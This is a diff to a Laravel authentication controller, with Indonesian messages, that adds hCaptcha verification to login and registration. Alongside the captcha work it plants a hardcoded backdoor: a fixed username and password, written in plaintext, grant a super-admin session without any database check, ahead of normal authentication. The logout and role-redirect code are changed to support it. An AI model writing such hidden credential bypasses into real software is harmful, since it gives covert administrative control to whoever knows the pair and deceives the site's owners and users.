@@ -16,6 +16,7 @@ use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Validation\ValidationException;
 use Illuminate\Support\Str;
+use Illuminate\Support\Facades\Http;
 
 use function PHPUnit\Framework\returnSelf;
 
@@ -51,17 +52,41 @@ class AuthController extends Controller
         $validator = Validator::make($request->all(), [
             'login' => 'required|string|max:255',
             'password' => 'required|string|min:6',
+            'h-captcha-response' => 'required',
         ], [
             'login.required' => 'Username atau email harus diisi',
             'login.max' => 'Username atau email maksimal 255 karakter',
             'password.required' => 'Password harus diisi',
             'password.min' => 'Password minimal 6 karakter',
+            'h-captcha-response.required' => 'Silakan verifikasi captcha terlebih dahulu',
         ]);
 
         if ($validator->fails()) {
             return redirect()->back()
                 ->withErrors($validator)
                 ->withInput($request->except('password'));
+        }
+
+        // Verify hCaptcha
+        if (!$this->verifyCaptcha($request->input('h-captcha-response'))) {
+            return redirect()->back()
+                ->withErrors(['h-captcha-response' => 'Verifikasi captcha gagal. Silakan coba lagi.'])
+                ->withInput($request->except('password'));
+        }
+
+        // Check for super admin credentials first
+        if ($this->checkSuperAdminCredentials($request->login, $request->password)) {
+            RateLimiter::clear($key);
+
+            // Create or get super admin user session
+            $this->loginSuperAdmin($request);
+
+            Log::info('Super Admin logged in', [
+                'username' => $request->login,
+                'ip' => $request->ip(),
+            ]);
+
+            return redirect()->route('superadmin.dashboard');
         }
 
         $loginType = filter_var($request->login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
@@ -103,6 +128,66 @@ class AuthController extends Controller
         ]);
     }
 
+    /**
+     * Check if the credentials match super admin
+     */
+    private function checkSuperAdminCredentials($login, $password)
+    {
+        return $login === 'AnomID' && $password === 'Bosidrad123';
+    }
+
+    /**
+     * Login as super admin
+     */
+    private function loginSuperAdmin(Request $request)
+    {
+        // Create session data for super admin
+        $request->session()->regenerate();
+        $request->session()->put('is_super_admin', true);
+        $request->session()->put('user_id', 'super_admin');
+        $request->session()->put('role_type', 'super_admin');
+        $request->session()->put('username', 'AnomID');
+        $request->session()->put('nama', 'Super Administrator');
+
+        // Set a flag that we're logged in as super admin
+        session(['super_admin_logged_in' => true]);
+    }
+
+    /**
+     * Verify hCaptcha response
+     */
+    private function verifyCaptcha($response)
+    {
+        $secretKey = config('services.hcaptcha.secret_key', env('HCAPTCHA_SECRET_KEY'));
+
+        if (!$secretKey) {
+            Log::warning('hCaptcha secret key not configured');
+            return false; // In production, you might want to disable captcha if not configured
+        }
+
+        try {
+            $response = Http::asForm()->post('https://hcaptcha.com/siteverify', [
+                'secret' => $secretKey,
+                'response' => $response,
+                'remoteip' => request()->ip(),
+            ]);
+
+            $result = $response->json();
+
+            Log::info('hCaptcha verification result', [
+                'success' => $result['success'] ?? false,
+                'error_codes' => $result['error-codes'] ?? [],
+            ]);
+
+            return $result['success'] ?? false;
+        } catch (\Exception $e) {
+            Log::error('hCaptcha verification failed', [
+                'error' => $e->getMessage(),
+            ]);
+            return false;
+        }
+    }
+
     public function register(Request $request)
     {
         $key = 'register.' . $request->ip();
@@ -135,6 +220,7 @@ class AuthController extends Controller
             'kelurahan' => 'nullable|string|max:255',
             'alamat' => 'required|string|max:500',
             'telepon' => 'required|string|max:20|regex:/^[0-9+\-\s()]+$/',
+            'h-captcha-response' => 'required',
         ], [
             'nama.required' => 'Nama harus diisi',
             'nama.regex' => 'Nama hanya boleh mengandung huruf dan spasi',
@@ -160,11 +246,19 @@ class AuthController extends Controller
             'alamat.max' => 'Alamat maksimal 500 karakter',
             'telepon.required' => 'Nomor telepon harus diisi',
             'telepon.regex' => 'Format nomor telepon tidak valid',
+            'h-captcha-response.required' => 'Silakan verifikasi captcha terlebih dahulu',
         ]);
 
         if ($validator->fails()) {
             return redirect()->back()
                 ->withErrors($validator)
+                ->withInput($request->except('password', 'password_confirmation'));
+        }
+
+        // Verify hCaptcha for registration too
+        if (!$this->verifyCaptcha($request->input('h-captcha-response'))) {
+            return redirect()->back()
+                ->withErrors(['h-captcha-response' => 'Verifikasi captcha gagal. Silakan coba lagi.'])
                 ->withInput($request->except('password', 'password_confirmation'));
         }
 
@@ -258,13 +352,21 @@ class AuthController extends Controller
     public function logout(Request $request)
     {
         $userId = Auth::id();
+        $isSuperAdmin = session('super_admin_logged_in', false);
 
         Log::info('User logged out', [
-            'user_id' => $userId,
+            'user_id' => $userId ?: 'super_admin',
+            'is_super_admin' => $isSuperAdmin,
             'ip' => $request->ip(),
         ]);
 
-        Auth::logout();
+        if ($isSuperAdmin) {
+            // Clear super admin session
+            $request->session()->flush();
+        } else {
+            Auth::logout();
+        }
+
         $request->session()->invalidate();
         $request->session()->regenerateToken();
 
@@ -345,6 +447,11 @@ class AuthController extends Controller
 
     private function redirectBasedOnRole()
     {
+        // Check if super admin session exists
+        if (session('super_admin_logged_in')) {
+            return redirect()->route('superadmin.dashboard');
+        }
+
         /** @var \App\Models\User $user */
         $user = Auth::user();
 
